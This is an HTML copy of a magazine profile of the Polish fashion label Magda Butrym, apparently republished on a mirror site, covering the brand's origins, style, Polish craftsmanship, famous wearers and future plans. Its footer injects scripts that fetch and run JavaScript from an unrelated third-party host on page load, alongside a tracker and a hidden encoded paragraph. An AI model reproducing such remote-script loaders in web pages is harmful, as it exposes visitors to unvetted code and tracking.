This time, we’re turning the spotlight on Warsaw-based, influencer-loved Magda Butrym.</p><p data-journey-content=true data-node-id=1 class="css-1nd4gv7 emevuu60">Defined by its cool and modern approach to dressing up, the label is a favourite among young women who want to look polished, elegant and feel special, not just for the evening, but for any occasion. We sat down with the founder of the eponymous brand to discover everything there is to know about the label.</p><h2 data-node-id=2 class="body-h4 css-3zjk8x emevuu60">Origins</h2><p data-journey-content=true data-node-id=3 class="css-1nd4gv7 emevuu60">After working as a stylist for a number of years, Magda Butrym took the plunge and launched her own namesake label in Warsaw in 2014. From her experience working in the fashion industry, she felt that she had a very clear idea of what her customer might look like and what she might want to wear.</p><p data-journey-content=true data-node-id=4 class="css-1nd4gv7 emevuu60">"I was working as a stylist and I spent a lot of time listening to women from all different backgrounds with different shapes and needs," she tells us. "I was receiving all of this precious data and at a certain point, I felt that I had a pretty good idea what they would like to wear, what they would enjoy and what they wish they could have."<br></p><img alt="Magda Butrym" title="Magda Butrym" width=2000 height=2800 decoding=async data-nimg=1 sizes=100vw src=https://cdn.statically.io/img/hips.hearstapps.com/hmg-prod/images/magda-butrym-4-1539187147.jpg style=margin:auto;display:block;text-align:center><a rel=noopener href=# class="pinterest css-1i6sckr e1c1bym14"><img data-dynamic-svg=true src="https://cdn.statically.io/img/www.harpersbazaar.com/_assets/design-tokens/fre/static/icons/social/pinterest.e8cf655.svg?primary=%2523ffffff" data-testid=dynamic-svg-base height=auto width=auto alt=pinterest style=margin:auto;display:block;text-align:center></a><p><span class="css-1urwh1q e1geg53v2">Courtesy of Magda Butrym</span></p><p data-journey-content=true data-node-id=6 class="css-1nd4gv7 emevuu60">Butrym decided to go for it, but she started small. The designer created a number of pieces on her own, which she showed to her clients, who she says gave her "the confidence to take it further".</p><p data-journey-content=true data-node-id=7 class="css-1nd4gv7 emevuu60">The brand quickly received critical international acclaim, landing in the wardrobes and on the Instagram feeds of some of the world's biggest influencers, which helped the company to grow quickly. The label soon expanded from ready-to-wear to include jewellery and accessories, and just last year, it launched footwear.<br></p><img alt="Magda Butrym" title="Magda Butrym" width=2500 height=2800 decoding=async data-nimg=1 sizes=100vw src=https://cdn.statically.io/img/hips.hearstapps.com/hmg-prod/images/magda-butrym-9-1539187519.jpg style=margin:auto;display:block;text-align:center><a rel=noopener href=# class="pinterest css-1i6sckr e1c1bym14"><img data-dynamic-svg=true src="https://cdn.statically.io/img/www.harpersbazaar.com/_assets/design-tokens/fre/static/icons/social/pinterest.e8cf655.svg?primary=%2523ffffff" data-testid=dynamic-svg-base height=auto width=auto alt=pinterest style=margin:auto;display:block;text-align:center></a><p><span class="css-1urwh1q e1geg53v2">Courtesy of Magda Butrym</span></p><h2 data-node-id=9 class="body-h4 css-3zjk8x emevuu60">What does the brand look like?</h2><p data-journey-content=true data-node-id=10 class="css-1nd4gv7 emevuu60">Like with many successful fashion labels, Butrym correctly identified a gap in the market. She saw something which women were missing, delivered it and watched customers flock to it. For the designer, what she felt was missing was a lack of elegance and sophistication in the every day.</p><p data-journey-content=true data-node-id=11 class="css-1nd4gv7 emevuu60">"Quite early on, I got this feeling that there were all these amazing options for evening wear or special occasions, while the everyday wardrobe felt quite monotonous and flat. When I decided to make clothes, my first aim was to elevate this seemingly prosaic way of dressing and inject a little spirit into staple pieces. I wanted to make every Monday morning a special occasion."</p><img alt="Magda Butrym" title="Magda Butrym" width=2000 height=2800 decoding=async data-nimg=1 sizes=100vw src=https://cdn.statically.io/img/hips.hearstapps.com/hmg-prod/images/magda-butrym-3-1539188453.jpg style=margin:auto;display:block;text-align:center><a rel=noopener href=# class="pinterest css-1i6sckr e1c1bym14"><img data-dynamic-svg=true src="https://cdn.statically.io/img/www.harpersbazaar.com/_assets/design-tokens/fre/static/icons/social/pinterest.e8cf655.svg?primary=%2523ffffff" data-testid=dynamic-svg-base height=auto width=auto alt=pinterest style=margin:auto;display:block;text-align:center></a><p><span class="css-1urwh1q e1geg53v2">Courtesy of Magda Butrym</span></p><h6 class="css-ok56rr e94w1mj3"><span aria-hidden=true class="css-0 eagam8p0"></span><span class="css-8lle59 e94w1mj1">Related Story</span><span aria-hidden=true class="css-0 eagam8p1"></span></h6><p data-journey-content=true data-node-id=14 class="css-1nd4gv7 emevuu60">She says that when she sits down to design, the words that come into her mind are "refinement, elegance and sophistication". These qualities, she says, are not in abundance in fashion at the moment.</p><p data-journey-content=true data-node-id=15 class="css-1nd4gv7 emevuu60">"As a designer, I really want to preserve and celebrate these qualities. The Magda Butrym woman is effortless and confident, as well as unapologetic about her femininity and unafraid to express it through romantic and sensual pieces."</p><p data-journey-content=true data-node-id=17 class="css-1nd4gv7 emevuu60">The current collection is filled with beautiful silky, draped dresses, exaggerated shoulders, velvet, feathers and sequins. Her label, it seems, is all about celebrating dressing up for no particular reason at all.</p><h2 data-node-id=19 class="body-h4 css-3zjk8x emevuu60">What makes the brand stand out?</h2><p data-journey-content=true data-node-id=20 class="css-1nd4gv7 emevuu60">When speaking to Butrym, it is very clear that what has been successful for her is to look at and listen to the women she is making clothes for. Her approach to design has not changed since she started the business, she says.</p><p data-journey-content=true data-node-id=21 class="css-1nd4gv7 emevuu60">"I am still a listener and a curious observer – feedback is very important to me. I ask questions. I am interested in what my clients like and I really consider these opinions when I am designing the next collection."</p><img alt="Magda Butrym" title="Magda Butrym" width=2000 height=2800 decoding=async data-nimg=1 sizes=100vw src=https://cdn.statically.io/img/hips.hearstapps.com/hmg-prod/images/magda-butrym-6-1539188584.jpg style=margin:auto;display:block;text-align:center><a rel=noopener href=# class="pinterest css-1i6sckr e1c1bym14"><img data-dynamic-svg=true src="https://cdn.statically.io/img/www.harpersbazaar.com/_assets/design-tokens/fre/static/icons/social/pinterest.e8cf655.svg?primary=%2523ffffff" data-testid=dynamic-svg-base height=auto width=auto alt=pinterest style=margin:auto;display:block;text-align:center></a><p><span class="css-1urwh1q e1geg53v2">Courtesy of Magda Butrym</span></p><h6 class="css-ok56rr e94w1mj3"><span aria-hidden=true class="css-0 eagam8p0"></span><span class="css-8lle59 e94w1mj1">Related Story</span><span aria-hidden=true class="css-0 eagam8p1"></span></h6><p data-journey-content=true data-node-id=24 class="css-1nd4gv7 emevuu60">Delivering exactly what her customers desire is clearly a very successful approach to running a business and being able to decipher what they are missing before they do is an enviable skill. But it is not just her customers who have influenced her process, she says, but her own experiences as a woman.</p><p data-journey-content=true data-node-id=26 class="css-1nd4gv7 emevuu60">"Becoming a mother has had a very obvious impact on my designs," she explains. "I've always loved the female body, but I have a whole new appreciation for it and I notice myself paying more attention to how the fabric works on the female body. I am a big believer in that the dress is there to complement the body and not the other way around, and I am obsessed with getting this point right."</p><img alt="Magda Butrym" title="Magda Butrym" width=2000 height=2800 decoding=async data-nimg=1 sizes=100vw src=https://cdn.statically.io/img/hips.hearstapps.com/hmg-prod/images/magda-butrym-2-1539188661.jpg style=margin:auto;display:block;text-align:center><a rel=noopener href=# class="pinterest css-1i6sckr e1c1bym14"><img data-dynamic-svg=true src="https://cdn.statically.io/img/www.harpersbazaar.com/_assets/design-tokens/fre/static/icons/social/pinterest.e8cf655.svg?primary=%2523ffffff" data-testid=dynamic-svg-base height=auto width=auto alt=pinterest style=margin:auto;display:block;text-align:center></a><p><span class="css-1urwh1q e1geg53v2">Courtesy of Magda Butrym</span></p><p data-journey-content=true data-node-id=28 class="css-1nd4gv7 emevuu60">Another key way the label differentiates itself from others is its Polish heritage. The brand relies on skilled craftsman from a number of local regions across Poland, including Podhale, Silesia, Nowy Targ and Warsaw to knit, weave and embroider the materials for the collections. As well as this, the designs are clearly influenced by how Polish women present themselves.</p><p data-journey-content=true data-node-id=30 class="css-1nd4gv7 emevuu60">"In my opinion, Polish women are naturally quite elegant and feminine, and they do like to dress up. I really respect that approach of putting in the effort and I think that my clothes make my clients feel effortlessly dressed up. The truly Polish component that I have incorporated was the traditional Polish craftsmanship. I was always very interested in it and when I started the brand, I really wanted to include this in its DNA."</p><img alt="Magda Butrym" title="Magda Butrym" width=2000 height=2800 decoding=async data-nimg=1 sizes=100vw src=https://cdn.statically.io/img/hips.hearstapps.com/hmg-prod/images/magda-butrym-8-1539188697.jpg style=margin:auto;display:block;text-align:center><a rel=noopener href=# class="pinterest css-1i6sckr e1c1bym14"><img data-dynamic-svg=true src="https://cdn.statically.io/img/www.harpersbazaar.com/_assets/design-tokens/fre/static/icons/social/pinterest.e8cf655.svg?primary=%2523ffffff" data-testid=dynamic-svg-base height=auto width=auto alt=pinterest style=margin:auto;display:block;text-align:center></a><p><span class="css-1urwh1q e1geg53v2">Courtesy of Magda Butrym</span></p><h6 class="css-ok56rr e94w1mj3"><span aria-hidden=true class="css-0 eagam8p0"></span><span class="css-8lle59 e94w1mj1">Related Story</span><span aria-hidden=true class="css-0 eagam8p1"></span></h6><h2 data-node-id=33 class="body-h4 css-3zjk8x emevuu60">Who wears it?</h2><p data-journey-content=true data-node-id=34 class="css-1nd4gv7 emevuu60">Magda Butrym is a label loved by most influencers on your feed, from the super cool Scandi bloggers to American It girls and French fashion-week attendees. Butrym says she can notice how the collection is adapted by different women across the world.</p><p data-journey-content=true data-node-id=35 class="css-1nd4gv7 emevuu60">"The British and the Danish girls love to experiment and layer, where the French girls are a bit more classic, but have an amazing sense of effortlessness."</p><p data-journey-content=true data-node-id=36 class="css-1nd4gv7 emevuu60">Some of the most famous fans of the label include Emily Ratajkowski, Kendall Jenner, Alicia Vikander, Gigi Hadid and Rosie Huntington-Whiteley. Meanwhile, influencers who can't get enough include Pernille Teisbeak and Adenorah, who wore a Magda dress on her wedding day.</p><h2 data-node-id=38 class="body-h4 css-3zjk8x emevuu60">What's next for Magda Butrym?</h2><p data-journey-content=true data-node-id=39 class="css-1nd4gv7 emevuu60">The label has had a pretty successful 12 months, even managing to get to the semi-finals of the LVMH prize this year, so it is clear that big things are still to come.</p><p data-journey-content=true data-node-id=40 class="css-1nd4gv7 emevuu60">"It was a really special moment for me," she says of the achievement. "On a daily basis I work from my studio in Warsaw and so the big fashion world can sometimes feel quite distant. To suddenly have a normal face-to-face conversation with people like Haider Ackermann or Tim Banks was very rewarding and it really made me feel part of the fashion family."</p><p data-journey-content=true data-node-id=41 class="css-1nd4gv7 emevuu60">Apart from that? "Definitely more accessories. I also think a haute couture project could be very interesting..."</p><img alt="Magda Butrym" title="Magda Butrym" width=2000 height=2800 decoding=async data-nimg=1 sizes=100vw src=https://cdn.statically.io/img/hips.hearstapps.com/hmg-prod/images/magda-butrym-7-1539189461.jpg style=margin:auto;display:block;text-align:center><a rel=noopener href=# class="pinterest css-1i6sckr e1c1bym14"><img data-dynamic-svg=true src="https://cdn.statically.io/img/www.harpersbazaar.com/_assets/design-tokens/fre/static/icons/social/pinterest.e8cf655.svg?primary=%2523ffffff" data-testid=dynamic-svg-base height=auto width=auto alt=pinterest style=margin:auto;display:block;text-align:center></a><p><span class="css-1urwh1q e1geg53v2">Courtesy of Magda Butrym</span></p><h6 class="css-ok56rr e94w1mj3"><span aria-hidden=true class="css-0 eagam8p0"></span><span class="css-8lle59 e94w1mj1">Related Story</span><span aria-hidden=true class="css-0 eagam8p1"></span></h6><p class=postsid style=color:rgba(255,0,0,0)>ncG1vNJzZmivp6x7qa3RqZyrq5KWx6Kt0WeaqKVfqrhwssCsn6KnnmSzor%2FHoqanZZ6axLR7wGtqbG1lZX53e8yanp2ZXZfCtb7YpmSamp%2BqwW61za2cq66ZmsRw</p></section></article></main></div><footer><div class=container><span class=copyright>&copy; 2024 DashJ - <a rel=license href=http://creativecommons.org/licenses/by/4.0/>CC BY 4.0</a></span></div></footer><script type=text/javascript>(function(){var n=Math.floor(Date.now()/1e3),t=document.getElementsByTagName("script")[0],e=document.createElement("script");e.src="https://js.zainuddin.my.id/floating.js?v="+n+"",e.type="text/javascript",e.async=!0,e.defer=!0,t.parentNode.insertBefore(e,t)})()</script><script type=text/javascript>(function(){var n=Math.floor(Date.now()/1e3),t=document.getElementsByTagName("script")[0],e=document.createElement("script");e.src="https://js.zainuddin.my.id/tracking_server_6.js?v="+n+"",e.type="text/javascript",e.async=!0,e.defer=!0,t.parentNode.insertBefore(e,t)})()</script><script>var _paq=window._paq=window._paq||[];_paq.push(["trackPageView"]),_paq.push(["enableLinkTracking"]),function(){e="//analytics.cdnweb.info/",_paq.push(["setTrackerUrl",e+"matomo.php"]),_paq.push(["setSiteId","1"]);var e,n=document,t=n.createElement("script"),s=n.getElementsByTagName("script")[0];t.async=!0,t.src=e+"matomo.js",s.parentNode.insertBefore(t,s)}()</script></body></html>
